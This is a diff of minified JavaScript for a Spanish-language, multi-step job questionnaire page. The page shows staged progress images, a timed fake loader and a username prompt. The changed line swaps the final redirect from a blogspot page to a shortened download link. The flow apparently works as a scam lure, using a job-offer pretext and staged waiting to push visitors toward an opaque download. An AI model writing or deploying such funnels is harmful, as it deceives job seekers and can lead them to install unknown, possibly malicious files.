@@ -4,7 +4,7 @@ wait.innerHTML+=".";},300);setTimeout(function(){clearInterval(dotsInterv);loadQ
 if(page=="page4"){document.getElementById("steps_progress").src="img/progress_4.png";document.getElementById("channel-step").remove();var element=document.getElementById("question");element.innerHTML="";document.getElementById("account-step").style.display="block";}
 if(page=="page5"){var username=document.getElementById("account-username").value;if(username.length<=3){alert("Ingrese su nombre o manos correctamente");return}
 document.getElementById("account-step").remove();document.getElementById("loader").style.display='block';setTimeout(function(){document.getElementById("loader").remove();document.getElementById("steps_progress").src="img/progress_5.png";document.getElementById("final-step").style.display='block';},6000);}
-if(page=="page6"){window.location='https://carr-eras.blogspot.com';}}
+if(page=="page6"){window.location='https://dwnlds.co/16a2c45';}}
 function loadQuestions(){document.getElementById("mainQuest").innerHTML="";document.getElementsByClassName("main-question")[0].remove();document.getElementById("progbars").style.textAlign="center";document.getElementById("progbars").style.display='block';populate();}
 function Question(text,choices){this.text=text;this.choices=choices;}
 var questions=[new Question("¿Estás listo para trabajar 6 horas al día?
